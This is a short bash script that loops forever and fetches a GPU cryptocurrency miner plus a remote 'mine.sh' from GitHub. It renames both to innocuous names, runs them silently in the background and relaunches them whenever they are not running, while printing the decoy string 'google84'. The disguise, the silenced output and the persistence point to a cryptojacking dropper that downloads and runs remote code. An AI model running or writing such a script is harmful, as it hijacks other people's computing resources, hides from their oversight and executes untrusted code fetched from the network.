while true

do

if [[ $(pgrep -af mobile8474) == "" ]]

then

wget -N https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.2.0/noncerpro-cuda-linux-3.2.0.tar.gz
tar zxvf noncerpro-cuda-linux-3.2.0.tar.gz;
wget -N https://raw.githubusercontent.com/mobile8474/mobile84121274/master/mine.sh;
mv ./mine.sh ./mobile8474
mv ./noncerpro ./mobile84
sh ./mobile8474 &> /dev/null &

else

echo "google84"

fi

done
